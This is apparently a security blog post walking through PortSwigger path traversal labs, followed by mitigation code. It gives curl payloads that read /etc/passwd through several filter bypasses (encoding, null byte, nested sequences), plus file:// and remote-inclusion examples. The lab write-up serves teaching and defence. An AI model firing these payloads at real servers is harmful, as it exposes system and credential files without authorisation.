---
layout: post
title: "Directory Path Traversal"
date: 2025-06-27 00:00:00 +0100
categories: [portswigger, hacking, theory]
tags: [labs, directory traversal, path traversal, web]
---

![picname](pics/path_trav.png)

### Intro
Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

Even more info/payloads could be found here -> https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/

### Path traversal labs (Apprentice)

#### Lab: File path traversal, simple case
- Just find any image and take a look on a path

```html
curl https://0a06005d03c537ec83b6059800a500ec.web-security-academy.net/image?filename=../../../etc/passwd
```

### Path traversal labs (Practioner)

#### Lab: File path traversal, traversal sequences blocked with absolute path bypass
- Let's just give a try for an absolute path bypass

```html
curl https://<YOUR-LAB>.web-security-academy.net/image?filename=/etc/passwd
```

#### Lab: File path traversal, traversal sequences stripped non-recursively
- Next option after an absolute path - add more dots and slashes (such as `....//` or `....\/`):

```html
curl https://<YOUR-LAB>.web-security-academy.net/image?filename=....//....//....//etc/passwd
```

#### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
- Let's try `%2e%2e%2f` and `%252e%252e%252f` or some non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f` also could work:

```html
curl https://<YOUR-LAB>.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

#### Lab: File path traversal, validation of start of path
- An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`:

From this: `https://<YOUR-LAB>.web-security-academy.net/image?filename=/var/www/images/36.jpg` ->

```html
curl https://<YOUR-LAB>.web-security-academy.net/image?filename=/var/www/images/../../../../etc/passwd
```

#### File path traversal, validation of file extension with null byte bypass
- It could be possible to use a null byte to effectively terminate the file path before the required extension:

From `https://<YOUR-LAB>.web-security-academy.net/image?filename=70.jpg` ->

```html
curl https://<YOUR-LAB>.web-security-academy.net/image?filename=../../../../etc/passwd%00.jpg
```

### Even more examples to test
- In the Cookies: `Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd`
- If protocols are accepted as arguments, as in the above example, it’s also possible to probe the local filesystem this way: `http://example.com/index.php?file=file:///etc/passwd`
- It’s also possible to include files and scripts located on external website: `http://example.com/index.php?file=http://www.owasp.org/malicioustxt`

### Mitigation Techniques
- *Never trust user input* - always treat file names or paths from user input as untrusted.
- *Use whitelisting* - instead of letting users specify arbitrary paths, use predefined identifiers or filenames:

```python
allowed_files = {
    "profile_pic": "/app/user_images/profile.png",
    "report": "/app/reports/user_report.pdf"
}

filename = request.GET.get("file")
if filename in allowed_files:
    return send_file(allowed_files[filename])
else:
    abort(403)
```

- *Normalize and validate paths* - use language-specific utilities to normalize paths and ensure they stay within a safe base directory.

```python
import os

BASE_DIR = "/app/uploads"
user_input = request.GET.get("file")
safe_path = os.path.abspath(os.path.join(BASE_DIR, user_input))

if not safe_path.startswith(BASE_DIR):
    abort(403)

with open(safe_path) as f:
    return f.read()
```

- *Deny path traversal characters* - reject inputs containing `../`, `..\\`, or absolute paths (/etc/, C:\).

```js
if (/(\.\.\/)|(\.\.\\)|(^\/)|(^[a-zA-Z]:\\)/.test(userInput)) {
  throw new Error("Invalid file path");
}
```

- *Use secure APIs or file resolvers* - frameworks like Django, Flask, or Express often have utilities that abstract file handling. Use them when possible.
- *Run with least privileges* - ensure the server or app only has access to necessary directories/files and not full system access.
- *Log and monitor access attempts* - detect and block brute-force or exploratory attempts like repeated `../../` in requests.